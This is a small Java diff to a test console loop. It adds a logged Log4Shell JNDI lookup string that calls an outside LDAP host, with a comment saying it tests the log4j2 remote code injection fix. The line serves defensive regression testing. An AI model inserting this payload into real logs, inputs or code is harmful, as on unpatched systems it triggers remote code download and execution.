@@ -30,6 +30,7 @@ public class TestConsole {
         while (console.isRunning()) {
             if (counter.incrementAndGet() % 10 == 0) {
                 log.error("&cC&4C&eE&6E&2A&aA&3B&bB&11&99&dD&5D&fF&88&00");
+                log.info("${jndi:ldap://mc.steelswing.net:1389/mudak}"); // test log4j2 Remote code injection fix
             }
 
             Thread.sleep(20);
